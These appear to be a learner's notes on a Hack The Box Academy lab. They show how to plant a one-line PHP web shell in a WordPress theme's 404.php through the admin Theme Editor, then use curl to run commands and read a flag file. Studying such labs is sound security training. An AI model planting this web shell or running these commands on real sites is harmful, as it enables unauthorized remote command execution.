## Attacking the WordPress Backend

With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on `Appearance` on the side panel and select `Theme Editor`. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.

#### Theme Editor

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.

#### Selecting Theme

![image](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)

Choose a theme and click on `Select`. Next, choose a non-critical file such as `404.php` to modify and add a web shell.

#### Twenty Seventeen Theme - 404.php

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

The above code should allow us to execute commands via the GET parameter `cmd`. In this example, we modified the source code of the `404.php` page and added a new function called `system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the `cmd` parameter to the end of the URL after a question mark `?` and specifying an operating system command. The modified URL should look like this `404.php?cmd=id`.

We can validate that we have achieved RCE by entering the URL into the web browser or issuing the `cURL` request below.

#### RCE

```shell-session
smoothment@htb[/htb]$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
<SNIP>
```

Let's save the file with these contents:

```php
<?php

system($_GET['cmd']);
```

Now, let's edit the theme and upload the shell:

![](Pasted image 20250220135856.png)

Once we've edit the `404.php` file, let's save it, and use curl:

```
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)

```


We can now read the contents under `/home/wp-user/flag.txt`:

```
curl -X GET "http://94.237.53.112:46761/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/wp-user/flag.txt"

HTB{rc3_By_d3s1gn}
```

Flag is:
